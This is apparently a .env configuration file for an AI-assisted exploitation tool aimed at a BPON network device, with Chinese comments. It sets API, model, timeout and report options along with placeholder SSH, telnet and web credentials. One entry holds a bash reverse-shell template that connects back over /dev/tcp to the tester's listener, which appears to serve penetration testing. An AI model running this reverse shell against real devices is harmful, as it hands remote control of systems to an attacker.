# OpenAI API配置
OPENAI_API_KEY=your_api_key_here
OPENAI_BASE_URL=https://api.openai.com/v1

# 默认LLM模型
DEFAULT_MODEL=gpt-4o

# 并发配置
MAX_WORKERS=5

# 输出目录
OUTPUT_DIR=./reports

# 漏洞利用配置
EXPLOIT_TIMEOUT=30

# 报告配置
REPORT_FORMAT=all

# 和bpon同网段的本地ip
BPON_LOCAL=1.1.1.2

# bpon ip
BPON_HOST=1.1.1.1

# bpon ssh port
BPON_SSH_PORT=22

# bpon telnet port
BPON_TELNET_PORT=23

# bpon reverse shell command
BPON_REVSHELL_CMD="bash -i >& /dev/tcp/{local_ip}/{listen_port} 0>&1 &"

# bpon ssh/telnet user
BPON_USER=user

# bpon ssh/telnet passwd
BPON_PASSWD=password

# bpon web user
BPON_WEB_USER=webuser

# bpon web passwd
BPON_WEB_PASSWD=webpasswd